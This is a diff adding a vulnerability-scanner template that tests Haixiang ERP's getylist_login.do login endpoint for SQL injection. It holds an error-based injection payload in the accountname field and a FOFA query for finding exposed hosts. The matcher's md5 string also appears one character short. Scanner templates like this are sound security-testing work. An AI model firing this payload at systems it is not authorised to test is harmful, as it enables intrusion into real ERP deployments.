@@ -1,0 +1,34 @@
+id: haixiang-erp-getylist_login-sqli
+
+info:
+  name: haixiang-erp-getylist_login-sqli
+  author: unknow
+  severity: high
+  description: 海翔ERP getylist_login.do 存在SQL注入漏洞。
+  tags: haixiang,sqli
+  metadata:
+    fofa-qeury: body="checkMacWaitingSecond"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        POST /getylist_login.do HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: 75
+        
+        accountname=test' and (updatexml(1,concat(0x7e,(select md5(123)),0x7e),1));--
+
+    payloads:
+      sqli:
+        - "select md5(123)"
+               
+    matchers:     
+      - type: dsl
+        name: sqli
+        dsl:
+          - "status_code == 500 && contains(body,'202cb962ac59075b964b07152d234b7') && contains(header,'text/html')" 
